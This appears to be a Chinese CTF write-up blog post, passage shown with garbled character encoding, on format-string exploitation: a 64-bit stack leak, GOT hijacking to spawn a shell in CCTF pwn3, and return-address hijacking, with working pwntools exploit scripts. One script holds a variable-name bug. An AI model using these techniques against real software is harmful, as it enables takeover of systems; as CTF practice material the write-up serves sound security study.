    <content type="html"><![CDATA[<p>ä¹ é¢˜å’Œä¸€äº›è§£é¢˜æŠ€å·§</p><span id="more"></span><h1 id="64-ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#64-ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="64 ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>64 ä½ç¨‹åºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ä¹‹å‰å­¦ä¹ åŸºç¡€çš„æ—¶å€™æˆ‘ä»¬éƒ½æŠŠç¨‹åºç¼–è¯‘æˆ32ä½ï¼Œ64ä½çš„æ¼æ´åŸç†ä¹Ÿæ˜¯ç›¸ä¼¼çš„ï¼Œåªä¸è¿‡è¿˜æ˜¯ä¼ å‚æ–¹å¼ä¸Šçš„ç»†å¾®å·®åˆ«ã€‚è™½ç„¶æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç›¸åº”å¯„å­˜å™¨ä¸­æ”¾å…¥æ•°æ®ï¼Œä½†æ˜¯ç¨‹åºä¾æ—§ä¼šæŒ‰ç…§æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸åº”æ ¼å¼å¯¹å…¶è¿›è¡Œè§£æã€‚</p><h4 id="ğŸŒ°ï¼š"><a href="#ğŸŒ°ï¼š" class="headerlink" title="ğŸŒ°ï¼š"></a>ğŸŒ°ï¼š</h4><p>é¢˜ç›®åœ¨è¿™é‡Œï¼š<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> </p><blockquote><p>è¿™é“é¢˜ç›®çš„åŸé¢˜é‡Œæœ‰è·å–æœ¬åœ°flag.txtæ–‡ä»¶çš„ä»£ç éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¦æœ¬åœ°å¤ç°çš„è¯éœ€è¦è‡ªå·±æ–°å»ºä¸€ä¸ªflag.txtæ–‡ä»¶</p></blockquote><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_run.png"></p><p>çœ‹çœ‹æºä»£ç ï¼Œä¸»è¦é€»è¾‘å°±æ˜¯å…ˆè·å–flagå†…å®¹æ”¾åœ¨v10é‡Œï¼Œè·å–ç”¨æˆ·è¾“å…¥è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„flagæ­£ç¡®ï¼Œåˆ™è¾“å‡ºflagï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦è®© <code>v10[j]=v4</code> ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_main.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²è§£é¢˜çš„æ­¥éª¤ï¼Œæˆ‘ä»¬é¦–å…ˆç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²å˜é‡çš„åç§»ä½ç½®ã€‚</p><p>åœ¨printfå¤„ä¸‹æ–­ç‚¹ï¼Œæ³¨æ„æˆ‘ä»¬è¦è¾“å‡ºçš„æ˜¯é¢˜ç›®çš„flagï¼Œæ‰€ä»¥è·å–çš„æ˜¯é¢˜ç›®flagçš„åç§»ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/gdb_padding.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºç›¸å¯¹åº”çš„ flag æ˜¯æ ˆä¸Šçš„ç¬¬å››ä¸ªå˜é‡ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œ64ä½çš„ç¨‹åºå‰å…­ä¸ªå˜é‡å‚¨å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œè€Œ fmt å­—ç¬¦ä¸²åˆåœ¨ rdi ä¸Šï¼Œæ‰€ä»¥ flag ç›¸å¯¹äº fmt å­—ç¬¦ä¸²çš„åç§»å°±æ˜¯ï¼ˆå‰©ä½™çš„äº”ä¸ªå¯„å­˜å™¨+4ï¼‰&#x3D;9ã€‚</p><p>æˆ–è€…ä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·æ¯”å¦‚ pwndbg ï¼Œæœ‰ä¸€æ¡ <code>fmtarg [ç›®æ ‡åœ°å€]</code> çš„æŒ‡ä»¤å¯ä»¥ç›´æ¥è¾“å‡ºåç§»ã€‚æ³¨æ„è¦æŠŠæ–­ç‚¹æ–­åœ¨printfã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodkuck_pwndbg.png"></p><p>æœ€ç»ˆçš„expä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;%9$s&#x27;</span><br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç”šè‡³æœ¬åœ°å¤ç°éƒ½ä¸ç”¨expï¼ˆx</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_exp.png"></p><p><del>(ä¸‰ä¸ªé—®å·æ˜¯å› ä¸ºæˆ‘å·æ‡’è®¾ç½®çš„æœ¬åœ°flagå’Œé¢˜ç›®åŸæœ¬çš„flagé•¿åº¦ä¸ä¸€æ ·)</del></p><h1 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h1><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å½“å‰ELFç¼–è¯‘ç³»ç»Ÿä½¿ç”¨å»¶è¿Ÿç»‘å®šçš„æŠ€æœ¯æ¥å®ç°å¯¹å…±äº«åº“çš„è°ƒç”¨è¿‡ç¨‹ï¼Œä¸»è¦ç”±GOTè¡¨å’ŒPLTè¡¨å®ç°ã€‚</p><p>åŸç†å¤§è‡´ä¸º : å½“ç›®æ ‡æ¨¡å—å­˜åœ¨ä¸€ä¸ªå¤–éƒ¨å…±äº«åº“çš„å‡½æ•°è°ƒç”¨æ—¶ï¼Œåœ¨æ±‡ç¼–å±‚é¢ä½¿ç”¨ call æŒ‡ä»¤å®ç°è°ƒç”¨ï¼Œå…¶ä½œç”¨ä¸ºè·³è½¬è‡³å¯¹åº”å‡½æ•°çš„ PLT è¡¨é¡¹å¤„æ‰§è¡Œï¼Œè¯¥è¡¨é¡¹çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸º jmp *[ å¯¹åº” GOT é¡¹çš„åœ°å€ ]ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œå‡½æ•°è°ƒç”¨æ—¶ï¼Œé€šè¿‡ GOT ä¸ PLT çš„åˆä½œï¼Œä¼šå°†æœ€ç»ˆè°ƒç”¨å‡½æ•°çš„åœ°å€ç¡®å®šä¸‹æ¥ï¼Œå¹¶å­˜æ”¾åœ¨å…¶å¯¹åº”çš„ GOT è¡¨é¡¹ä¸­ã€‚å½“åç»­å†å‘ç”Ÿè°ƒç”¨æ—¶ï¼Œ jmp *[ å¯¹åº” GOT é¡¹çš„åœ°å€ ] æŒ‡ä»¤å³è¡¨ç¤ºç›´æ¥è·³è½¬è‡³ç›®æ ‡å‡½æ•°å¤„æ‰§è¡Œã€‚</p><p>åœ¨Cç¨‹åºä¸­ï¼Œlibcå‡½æ•°éƒ½æ˜¯é€šè¿‡GOTè¡¨è·³è½¬çš„ã€‚åŒæ—¶ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å¼€å¯RELROä¿æŠ¤ï¼Œé‚£ä¹ˆæ¯ä¸ªLIBCå‡½æ•°å¯¹åº”çš„GOTè¡¨é¡¹æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ã€‚æˆ‘ä»¬å°±å¯ä»¥å€Ÿæ­¤ä¿®æ”¹æŸä¸€ä¸ªå‡½æ•°çš„GOTè¡¨åœ°å€ä¸ºå¦ä¸€ä¸ªå‡½æ•°ï¼Œä»è€Œè¿›è¡Œç›®æ ‡å‡½æ•°çš„è°ƒç”¨ã€‚</p><p>å‡è®¾æˆ‘ä»¬éœ€è¦å°†å‡½æ•°Açš„åœ°å€è¦†ç›–ä¸ºå‡½æ•°Bçš„åœ°å€ï¼Œæ­¥éª¤ä¸ºï¼š</p><ul><li>ç¡®å®š A çš„ GOT è¡¨åœ°å€</li><li>ç¡®å®š B çš„åœ°å€</li><li>å°†Bçš„åœ°å€å†™å…¥ A å¯¹åº”çš„ GOT è¡¨å¤„</li></ul><h4 id="ğŸŒ°ï¼š-1"><a href="#ğŸŒ°ï¼š-1" class="headerlink" title="ğŸŒ°ï¼š"></a>ğŸŒ°ï¼š</h4><p>é¢˜ç›®åœ¨è¿™é‡Œï¼š <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">2016 CCTF ä¸­çš„ pwn3</a> </p><h5 id="åˆ†æé¢˜ç›®"><a href="#åˆ†æé¢˜ç›®" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h5><p>æŸ¥çœ‹ä¿æŠ¤</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_checksec.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç é€»è¾‘</p><p>é¦–å…ˆåœ¨mainå‡½æ•°ä¸­çš„ <code>ask_username() </code>å‡½æ•°ä¸­æœ‰ä¸€ä¸ª scanf å‡½æ•°ï¼Œå¹¶é€šè¿‡å¾ªç¯å°†è¾“å…¥å€¼çš„ASCIIç å€¼åŠ ä¸€èµ‹å€¼ç»™ destï¼Œä¹Ÿå°±æ˜¯ä¸»å‡½æ•°ä¸­çš„s1ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askname.png"></p><p>æ³¨æ„ <code>ask_password</code> éƒ¨åˆ†çš„åˆ¤æ–­æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹çš„è¾“å…¥è¦æ±‚æ˜¯ <code>&quot;sysbdmin&quot;</code> å¯¹åº”çš„æ¯ä¸€å­—æ¯çš„ASCIIç å€¼å‡ä¸€ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askpassword.png"></p><p>å¯ä»¥åœ¨payloadé‡Œå†™ä¸€ä¸ªå¦‚ä¸‹çš„å‡½æ•°ï¼š <del>ï¼ˆæœ€åç»“æœæ˜¯ rxraclhm</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>():<br>    admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>    name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>        name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¿›å…¥ç¨‹åºä¸»å¾ªç¯åï¼ŒæŸ¥çœ‹æ¯ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œä¸‰ä¸ªå‡½æ•°å¯¹åº”æ¨¡æ‹Ÿ FTP çš„æ“ä½œã€‚æ²¡æœ‰åœ°æ–¹å¯ä»¥æ ˆæº¢å‡ºï¼Œè¦æŒ‰ç…§ç¨‹åºçš„é€»è¾‘ä¸€æ­¥ä¸€æ­¥è¿›è¡Œã€‚</p><p><code>put_file()</code> å‡½æ•°ï¼š</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_putfile.png"></p><p>ç”±äº <code>file_head</code> å˜é‡ä½äº BSS æ®µä¸Šï¼Œæ˜¯å…¨å±€å˜é‡ã€‚æ¯æ¬¡è°ƒç”¨ <code>put_file()</code> å‡½æ•°æ—¶ï¼Œå½“å‰ <code>file_head</code> å­˜å‚¨çš„åœ°å€éƒ½æ˜¯ä¸Šä¸€æ¬¡åˆ†é…çš„åœ°å€ï¼Œèµ‹å€¼ç»™ <code>v0[60]</code>ï¼Œè°ƒç”¨å³å°†ç»“æŸæ—¶ä¼šå°†æœ¬æ¬¡çš„åœ°å€èµ‹å€¼ç»™ <code>file_head</code> ï¼Œå°†ä¼šåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶èµ‹å€¼ç»™å¯¹åº”çš„å˜é‡ã€‚å¦‚æ­¤å°±åœ¨æ ˆä¸Šå½¢æˆé“¾è¡¨å…³ç³»ï¼Œå¯ä»¥é€šè¿‡éå†é“¾è¡¨æ¥è®¿é—®ä¹‹å‰ä¿å­˜çš„æ–‡ä»¶ä¿¡æ¯ã€‚</p><p><code>show_dir()</code> ï¼š</p><p>è¯»å– <code>put_file() </code>ä¸­å½¢æˆçš„é“¾è¡¨çš„å†…å®¹ä¹Ÿå°±æ˜¯æ–‡ä»¶çš„åç§°å¹¶å­˜å‚¨åœ¨ s ä¸­ï¼Œæœ€åè°ƒç”¨ <code>puts()</code> è¾“å‡º sã€‚</p><p> <code>get_file()</code> å‡½æ•°:</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_getfile.png"></p><p>æœ‰ <code>printf(dest)</code> æ²¡æœ‰åŠ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä»»æ„å†™å’Œè¯»ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬ä¸èƒ½æ§åˆ¶ç¨‹åºè·³è½¬åˆ° <code>get_file()</code> å†ç›´æ¥ get flagï¼Œ<del>é‚£æ ·ä¸é«˜çº§</del> ç¨‹åºè®¾ç½®æ£€æŸ¥è¾“å…¥â€œ flag â€ä¼šè¿”å›è¾“å‡ºè­¦å‘Šã€‚</p><blockquote><p>åšé¢˜åŸåˆ™ï¼šæ²¡æœ‰ä¸€ä¸ªå‡½æ•°æ˜¯å¤šä½™çš„ğŸ¤¨</p></blockquote><h5 id="æ¼æ´åˆ©ç”¨æ€è·¯ï¼š"><a href="#æ¼æ´åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨æ€è·¯ï¼š"></a>æ¼æ´åˆ©ç”¨æ€è·¯ï¼š</h5><ul><li>ç»•è¿‡æœ€å¼€å§‹çš„æ£€æŸ¥å¯†ç ã€‚</li><li>åˆ©ç”¨ <code>printf()</code> è·å– puts çš„ GOT åœ°å€ï¼Œè¿›è€Œè·å¾— system å‡½æ•°çš„åœ°å€ã€‚</li><li>åˆ©ç”¨ <code>printf()</code> ä¿®æ”¹ puts çš„ GOT è¡¨åœ°å€ä¸º system å‡½æ•°çš„åœ°å€ã€‚</li><li>å°†<code>show_dir()</code> å‡½æ•°ä¸­ <code>puts()</code> çš„å‚æ•°ä¹Ÿå°±æ˜¯è¯»å–çš„æ–‡ä»¶ä¿¡æ¯æ”¹ä¸ºâ€ bin&#x2F;sh â€œã€‚</li></ul><p>é¦–å…ˆç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²å˜é‡å¯¹åº”çš„åç§»</p><p>æ‰¾åˆ° printf çš„åœ°å€ä¸‹æ–­ç‚¹ç”¨ gdb è°ƒè¯•ä¸€ä¸‹ï¼Œä¸è¦ç›´æ¥ <code>b printf</code>ï¼Œé‚£æ ·ä¼šåœ¨æ¯ä¸ª printf éƒ½åœä¸€æ¬¡ï¼Œæ•ˆç‡ä½ä½å“’ğŸ¤ª<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_addr.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_stack.png"></p><p>å¯ä»¥çœ‹å‡ºæ˜¯ç¬¬ä¸ƒä¸ªå‚æ•°ã€‚çŸ¥é“äº†å‚æ•°çš„åç§»å°±å¯ä»¥åˆ©ç”¨ printf è¾“å‡º put çš„åœ°å€å’Œä¿®æ”¹ put çš„ GOT è¡¨åœ°å€å•¦ã€‚</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ° pwntools ä¸­çš„ fmtstr_payload å‡½æ•°ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªå®Œæ•´çš„ payloadã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span><br></code></pre></td></tr></table></figure><ul><li>offsetï¼šå¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»</li><li>writesï¼šéœ€è¦åˆ©ç”¨%nå†™å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨å­—å…¸å½¢å¼ã€‚æ¯”å¦‚æˆ‘ä»¬è¦å°† printf çš„ GOT æ•°æ®æ”¹ä¸º system å‡½æ•°åœ°å€ï¼Œå°±å†™æˆ <code>&#123;printfGOT: systemAddress&#125;</code></li><li>numbwrittenï¼šå·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°ï¼Œé»˜è®¤å€¼ä¸º0ï¼Œä¹Ÿå¯å¦é™„å€¼</li><li>write_sizeï¼šå†™å…¥æ–¹å¼ï¼Œåˆ†ç±»æœ‰å­—èŠ‚ï¼ˆbyteï¼‰ã€åŒå­—èŠ‚ï¼ˆshortï¼‰å’Œå››å­—èŠ‚ï¼ˆintï¼‰ï¼Œå¯¹åº”ç€ hhnã€hn å’Œ nï¼Œé»˜è®¤å€¼æ˜¯byteã€‚</li></ul><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)   <span class="hljs-comment">#ç»•è¿‡å¯†ç æ£€æŸ¥ç™»ï¼Œé™†å¯†ç rxraclhm</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)<br>sh.sendline(name)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>show_puts_payload=p32(puts_got)+<span class="hljs-string">&#x27;%7$s&#x27;</span>     <span class="hljs-comment">#é€šè¿‡getæ³„éœ²putså‡½æ•°åœ°å€</span><br>sh.sendline(show_puts_payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>puts_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])   <span class="hljs-comment">#è·å¾—putsçš„å®é™…åœ°å€</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>puts_offset = libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = puts_addr - puts_offset + system_offset    <span class="hljs-comment">#è·å¾—systemçš„å®é™…åœ°å€</span><br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;puts_got: sys_addr&#125;)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)    <span class="hljs-comment">#è¯»å–æ–‡ä»¶å†…å®¹å¹¶æ‰§è¡Œprintfè¿›è¡Œåœ°å€è¦†ç›–</span><br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>sh.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)   <span class="hljs-comment">#è°ƒç”¨putsè¯»å–æ–‡ä»¶åå®é™…æ‰§è¡Œsystem(&#x27;bin/sh;&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h1><h4 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥åŠ«æŒç¨‹åºçš„è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„åœ°å€ã€‚</p><p>ğŸŒ°ï¼š</p><p> é¢˜ç›®åœ¨è¿™é‡Œï¼š<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">ä¸‰ä¸ªç™½å¸½ - pwnme_k0</a> </p><h5 id="åˆ†æé¢˜ç›®-1"><a href="#åˆ†æé¢˜ç›®-1" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h5><p>æ£€æŸ¥ä¿æŠ¤ï¼š</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_checksec.png"></p><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªç™»å½•çš„åŠŸèƒ½ï¼Œå¯ä»¥æŸ¥çœ‹å’Œä¿®æ”¹ä¿¡æ¯ã€‚ç©äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰å­˜å‚¨åŠŸèƒ½ï¼Œä¿®æ”¹äº†è´¦å·å¯†ç ä»¥åå®ƒå°±ä¼šè¦†ç›–æ–°çš„æ•°æ®ï¼Œä¸ä¼šä¿ç•™åŸæ¥çš„æ•°æ®ã€‚</p><p>çœ‹ä¸€ä¸‹æºç </p><p>æŠŠæ–‡ä»¶æ‹–è¿›idaå°±å‘ç°ç¨‹åºé‡Œç•™æœ‰åé—¨å‡½æ•°ï¼Œåœ¨ <code>sub_4008A6()</code> å‡½æ•°ä¸­ç›´æ¥<code>return system(&quot;/bin/sh&quot;)</code>ã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¨‹åºè·³è½¬åˆ°è¿™ä¸ªåœ°æ–¹ã€‚å‡½æ•°åœ°å€æ˜¯ <code>0x4008AA</code></p><p>åœ¨ <code>sub_400B07</code> å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸»å¾ªç¯ä¸­å¯¹åº”çš„é€‰é¡¹ <code>1.Sh0w Account Information</code> ä¸­æœ‰ <code>printf()</code> å‡½æ•°æ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¼¼ä¹æœ‰æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_printf.png"></p><p>æ ¹æ®å‡½æ•°é—´å˜é‡çš„å¯¹åº”å…³ç³»å›æº¯ä¸€ä¸‹ç¨‹åºå…¶ä»–çš„å‡½æ•°éƒ¨åˆ†ï¼Œå‘ç°åœ¨å½“åˆè¯»å…¥çš„æ—¶å€™å°±æ˜¯ä»¥è¿™ä¸ªå½¢å¼è¯»å…¥çš„ï¼ˆä¿®æ”¹è´¦å·å¯†ç æ—¶è¯»å…¥ä¹Ÿæ˜¯è¿™ä¸ªå½¢å¼ï¼‰</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_input.png"></p><h5 id="æ¼æ´åˆ©ç”¨æ€è·¯"><a href="#æ¼æ´åˆ©ç”¨æ€è·¯" class="headerlink" title="æ¼æ´åˆ©ç”¨æ€è·¯"></a>æ¼æ´åˆ©ç”¨æ€è·¯</h5><ul><li><p>è·å–systemæ‰§è¡Œæ—¶çš„åœ°å€</p></li><li><p>è·å–å‡½æ•°è¿”å›åœ°å€ï¼Œåˆ©ç”¨ printf ä¿®æ”¹è¿”å›åœ°å€ä¸º system åé—¨å‡½æ•°åœ°å€</p></li><li><p>åˆ©ç”¨å¯†ç è¾“å…¥å°†payloadå†™å…¥</p></li></ul><p>é¦–å…ˆç¡®å®šä¸€ä¸‹åç§»ï¼Œæ–­ç‚¹ä¸‹åœ¨ç¬¬äºŒä¸ª printf çš„åœ°æ–¹ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_stack.png"></p><p>å¯ä»¥çœ‹å‡ºè¾“å…¥çš„ç”¨æˆ·ååœ¨æ ˆä¸Šçš„ç¬¬ä¸‰ä¸ªä½ç½®ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æœ¬èº«åˆåœ¨rdiä¸Šï¼Œæ‰€ä»¥åç§»å°±æ˜¯ 6 + 3 - 1 &#x3D; 